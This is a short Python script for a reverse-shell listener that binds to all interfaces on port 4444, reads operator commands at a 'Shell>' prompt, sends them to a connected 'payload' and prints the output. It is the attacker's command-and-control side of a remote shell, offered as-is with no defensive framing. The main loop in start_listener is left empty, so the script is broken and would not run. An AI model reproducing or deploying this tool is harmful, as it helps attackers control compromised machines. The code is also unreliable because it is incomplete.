import socket
import threading

# Listener settings
LHOST = "0.0.0.0"  # Listener listens to all IPs
LPORT = 4444       # Listener port

# Send command to payload and receive result
def send_command_to_client(client_socket):
    while True:
        # Receive command from user
        command = input("Shell> ")
        
        if command.lower() == 'exit':
            print("Closing connection...")
            client_socket.close()
            break
        
        # Send command to client
        client_socket.send(command.encode())
        
        # Receive result from client
        response = client_socket.recv(4096).decode()
        print(response)

# Handle connections
def handle_client(client_socket, addr):
    print(f"Connection established with {addr}")
    send_command_to_client(client_socket)

# Run listener
def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LHOST, LPORT))
    server.listen(5)
    print(f"Listening on {LHOST}:{LPORT}...")
    
    while True:

# Start listener 
if __name__ == "__main__":
    start_listener()
